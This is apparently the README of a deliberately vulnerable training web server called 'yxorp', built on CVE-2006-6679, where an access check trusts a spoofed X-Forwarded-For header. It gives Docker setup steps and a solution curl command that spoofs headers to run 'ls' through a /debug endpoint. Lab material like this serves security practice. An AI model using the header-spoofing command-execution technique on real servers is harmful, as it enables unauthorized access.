# yxorp

yxorp is a vulnerable web server that can be exploited by sending the correct headers in a webrequest.


# Description

The vulns are based on the following techniques and CVEs:
1. [CVE-2006-6679](https://nvd.nist.gov/vuln/detail/CVE-2006-6679)
    > ... relies on the X-Forwarded-For HTTP header when verifying a client's status on an IP address ACL, which allows remote attackers to gain unauthorized access by spoofing this header.

## Building and Deploying with Docker

```
docker build -t yxorp .
docker run -p 80:80 yxorp
```

## Solving

`curl -H "X-Forwarded-For: 127.0.0.2:9999" -H "Host: localhost.localdomain" http://localhost:80/debug\?cmd\=ls`
